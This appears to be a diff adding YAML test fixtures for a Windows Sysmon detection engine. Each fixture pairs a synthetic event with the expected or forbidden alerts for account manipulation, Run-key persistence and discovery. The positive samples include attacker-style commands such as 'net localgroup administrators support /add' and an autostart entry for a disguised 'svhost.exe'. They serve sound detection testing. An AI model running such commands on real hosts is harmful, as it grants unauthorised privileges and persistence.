+    note: net localgroup administrators /add 加管理员组 → 疑似提权
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:31:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\net.exe</Data>
+          <Data Name="CommandLine">net localgroup administrators support /add</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.account_manipulation
+        risk: high
+        count: 1
+    forbid: [windows.create_local_account, windows.account_discovery]
+
+  - name: sysmon-localgroup-list-negative
+    note: net localgroup administrators 列出成员（只读）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:31:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\net.exe</Data>
+          <Data Name="CommandLine">net localgroup administrators</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.account_manipulation, windows.create_local_account]
+
+  - name: sysmon-registry-run-key-persistence
+    note: 写入 CurrentVersion\Run 自启动键 → 疑似持久化
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>13</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:32:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Users\a.smith\Desktop\svhost.exe</Data>
+          <Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run</Data>
+          <Data Name="Details">C:\Users\a.smith\Desktop\svhost.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.registry_run_key
+        risk: medium
+        count: 1
+    forbid: [windows.uac_bypass, windows.registry_bulk_write]
+
+  - name: sysmon-normal-registry-value-negative
+    note: 正常写入资源管理器配置键（非自启动）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>13</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:32:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\explorer.exe</Data>
+          <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced</Data>
+          <Data Name="Details">1</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.registry_run_key, windows.uac_bypass]
+
+  # ==========================================================================
+  # 发现（Discovery）
+  #
+  # 三条都依赖时间窗聚合，正样本因此包含多条事件；负样本给出「单次执行」，
+  # 用于验证阈值确实拦住了运维里的日常单发命令。
+  # ==========================================================================
+
+  - name: sysmon-repeated-netstat
+    note: 5 分钟内反复枚举网络连接 3 次 → 疑似发现阶段行为
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:40:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\netstat.exe</Data>
+          <Data Name="CommandLine">netstat.exe -ano</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:41:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\netstat.exe</Data>
+          <Data Name="CommandLine">netstat.exe -ano</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:42:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\netstat.exe</Data>
+          <Data Name="CommandLine">netstat.exe -ano</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.network_connection_discovery
+        risk: low
+        count: 3
+    forbid: [windows.discovery_command]
+
+  - name: sysmon-single-netstat-negative
+    note: 单次 netstat（正常排障）→ 未达阈值，不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:43:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\netstat.exe</Data>
+          <Data Name="CommandLine">netstat.exe -ano</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.network_connection_discovery, windows.discovery_command]
+
+  - name: sysmon-repeated-directory-traversal
+    note: 5 分钟内反复递归遍历目录 3 次 → 疑似发现/收集前置动作
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:50:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="CommandLine">cmd.exe /c dir /s C:\Users</Data>
+          <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:51:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="CommandLine">cmd.exe /c dir /s C:\Users\a.smith\Documents</Data>
+          <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:52:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="CommandLine">cmd.exe /c dir /s C:\Users\a.smith\Desktop</Data>
+          <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.file_directory_discovery
+        risk: low
+        count: 3
+    forbid: [windows.command_shell_suspicious_parent, windows.discovery_command]
+
+  - name: sysmon-single-directory-listing-negative
+    note: 单次 dir /s（正常查找文件）→ 未达阈值，不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:53:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="CommandLine">cmd.exe /c dir /s C:\Users\a.smith\Downloads\*.pdf</Data>
+          <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.file_directory_discovery, windows.command_shell_suspicious_parent]
+
+  - name: sysmon-wmic-account-enumeration
+    note: wmic useraccount 枚举本地账户 → 疑似发现阶段行为
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:55:01.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
+          <Data Name="CommandLine">wmic useraccount get name,sid</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.account_discovery
+        risk: low
+        count: 1
+    forbid: [windows.discovery_command, windows.create_local_account]
+
+  - name: sysmon-wmic-process-query-negative
+    note: wmic 查询进程列表（正常运维）→ 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:55:02.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
+          <Data Name="CommandLine">wmic process get name,processid</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: [windows.account_discovery]
